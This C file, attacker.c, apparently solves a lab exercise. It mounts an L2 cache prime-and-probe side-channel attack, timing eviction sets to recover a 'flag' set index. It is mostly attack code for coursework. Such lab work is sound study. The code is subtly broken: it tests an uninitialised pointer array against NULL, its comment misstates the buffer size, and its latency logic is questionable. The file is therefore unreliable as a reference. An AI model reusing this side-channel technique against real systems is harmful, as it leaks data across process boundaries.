// attacker.c

#include "util.h"
#include <stdio.h>
#include <stdlib.h>

#define BUFF_SIZE (256 * 4096)  // Hugepage buffer (2MB total)
#define NUM_SETS 2048           // Number of L2 cache sets on Skylake server (from /proc/cpuinfo)
#define PROBES_PER_SET 16       // Number of addresses to probe per set
#define SAMPLES 5               // Number of repeated samples for stability

int main() {
    uint8_t *buf;
    buf = (uint8_t *) get_buffer();  // Allocate 2MB huge page
    if (buf == NULL) {
        perror("Buffer allocation failed");
        return 1;
    }

    // Step 1: Prepare eviction sets (addresses that map to each L2 set)
    uint8_t *sets[NUM_SETS][PROBES_PER_SET];
    for (int i = 0; i < BUFF_SIZE; i += 64) {  // 64 bytes = one cache line
        uint64_t addr = (uint64_t)(buf + i);
        int set = (addr >> 6) & 0x7FF;  // L2 set index (11 bits for 2048 sets)
        if (set < NUM_SETS) {
            for (int j = 0; j < PROBES_PER_SET; j++) {
                if (sets[set][j] == NULL) {
                    sets[set][j] = (uint8_t *) addr;
                    break;
                }
            }
        }
    }

    // Step 2: Attack loop
    int best_set = -1;
    uint64_t best_latency = 0xFFFFFFFFFFFFFFFF;

    for (int set_idx = 0; set_idx < NUM_SETS; set_idx++) {
        // Skip sets with too few addresses
        if (sets[set_idx][PROBES_PER_SET-1] == NULL) continue;

        uint64_t total_time = 0;
        for (int sample = 0; sample < SAMPLES; sample++) {
            for (int probe = 0; probe < PROBES_PER_SET; probe++) {
                total_time += measure_one_block_access_time(sets[set_idx][probe]);
            }
        }

        if (total_time < best_latency) {
            best_latency = total_time;
            best_set = set_idx;
        }
    }

    printf("Captured flag: %d\n", best_set);
    return 0;
}
